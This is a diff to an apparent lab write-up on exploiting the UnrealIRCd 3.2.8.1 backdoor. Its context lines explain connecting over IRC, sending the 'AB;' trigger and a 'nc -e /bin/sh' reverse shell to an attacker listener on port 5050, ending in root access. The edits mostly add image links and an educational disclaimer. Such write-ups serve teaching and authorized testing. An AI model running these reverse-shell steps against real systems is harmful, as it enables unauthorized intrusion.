@@ -9,7 +9,7 @@ license: "CC BY-NC-SA 4.0"
 license_url: "https://creativecommons.org/licenses/by-nc-sa/4.0/"
 ---
 
-> ### Document Overview
+> ### 📌 Document Overview
 >
 > | Metadata | Details |
 > | :--- | :--- |
@@ -89,7 +89,7 @@ Why are we doing this? And what does this command mean?
 * -v: Enables verbose mode to output detailed connection status.
 * 192.168.56.104 6667: Specifies the target IP and standard IRC port 6667.
 
-![netcat_irc_connection_established.png]()
+![netcat_irc_connection_established](https://raw.githubusercontent.com/alpha-bet-writeups/img/main/img/UnrealIRCd_3.2.8.1/img/netcat_irc_connection_established.PNG)
 
 After we connected to UnrealIRCd, we need to do a simple login.:
 ```
@@ -100,7 +100,7 @@ Why are we doing this? And what does this command mean?
 * `NICK hacker`: Assigns a nickname to our current session on the server.
 * `USER alpha-bet 0 * : real alpha`: Registers the user details required by the IRC protocol specifications to keep the connection stable in the server's parser loop.
 
-![irc_user_nick_registration.png]()
+![irc_user_nick_registration](https://raw.githubusercontent.com/alpha-bet-writeups/img/main/img/UnrealIRCd_3.2.8.1/img/irc_user_nick_registration.PNG)
 
 Now that we are connected, it is time to deploy the exploit.
 As we discussed, the backdoor listens for the secret " AB; " trigger.
@@ -119,7 +119,7 @@ Why are we doing this? And what does this command mean?
 * `-l `: Listen mode to wait for incoming connections.
 * `-p 5050 `: Specifies the local port to monitor.
 
-![local_listener_netcat_port_5050.png]()
+![local_listener_netcat_port_5050](https://raw.githubusercontent.com/alpha-bet-writeups/img/main/img/UnrealIRCd_3.2.8.1/img/local_listener_netcat_port_5050.PNG)
 
 Now we'll go to the terminal where we initially opened the connection to the server. We'll then type the second command to perform a reverse shell.:
 ```
@@ -130,14 +130,20 @@ Why are we doing this? And what does this command mean?
 * `nc -e /bin/sh` : Executes Netcat and pipes the system shell directly through the socket.
 * `192.168.56.101 5050` : The attacker's IP and listening port.
 
-![unrealircd_backdoor_payload_injection.png]()
+![unrealircd_backdoor_payload_injection](https://raw.githubusercontent.com/alpha-bet-writeups/img/main/img/UnrealIRCd_3.2.8.1/img/unrealircd_backdoor_payload_injection.PNG)
 
 And now we have successfully received the reverse shell connection.:
 
-![reverse_shell_successful_connection.png]()
+![reverse_shell_successful_connection](https://raw.githubusercontent.com/alpha-bet-writeups/img/main/img/UnrealIRCd_3.2.8.1/img/reverse_shell_successful_connection.PNG)
 
 Now we whoami command:
 
-![root_privileges_whoami_confirmation.png]()
+![root_privileges_whoami_confirmation](https://raw.githubusercontent.com/alpha-bet-writeups/img/main/img/UnrealIRCd_3.2.8.1/img/root_privileges_whoami_confirmation.PNG)
 
 Boom! We've entered the system with root privileges.
+
+### Disclaimer ⚠️
+
+The information provided in this write-up is strictly for educational, research, and authorized penetration testing purposes. The techniques described herein are intended to help security researchers, system administrators, and cybersecurity enthusiasts understand local privilege escalation mechanisms to better secure systems. 
+
+Unlawful access, exploitation, or unauthorized testing on systems you do not own or lack explicit permission to test is strictly illegal and punishable by law. The author (**ALPHA-BET**) assumes no responsibility or liability for any misuse, damage, or illegal actions performed using the information contained in this document. Always practice ethically and within authorized boundaries.
